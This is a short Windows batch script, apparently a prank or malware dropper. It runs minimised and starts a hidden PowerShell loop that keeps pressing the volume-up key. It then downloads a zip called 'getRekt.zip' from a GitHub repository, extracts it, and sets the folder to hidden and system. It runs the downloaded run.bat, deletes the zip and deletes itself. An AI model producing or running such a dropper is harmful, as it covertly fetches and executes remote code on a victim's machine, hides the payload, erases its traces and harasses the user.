:: Script to automatically download and execute the program
@echo off
if not "%1" == "min" start /MIN cmd /c %0 min %1 & exit 0 >nul 2>&1
if not "%2" == "-silent" start /MIN "" powershell.exe "$obj = New-Object -ComObject WScript.Shell; while ($true) { $obj.SendKeys([char] 175) }"
cd /d %~dp0
curl -L -o getRekt.zip https://github.com/Shaymin-HEG-001/Mikroschrott/archive/refs/heads/master.zip
tar -xf .\getRekt.zip
start /MIN "" powershell.exe "Set-ItemProperty -Path .\Mikroschrott-master -Name Attributes -Value 6"
del .\getRekt.zip
start /MIN "" .\Mikroschrott-master\run.bat %2
del .\netrun.bat
exit 0
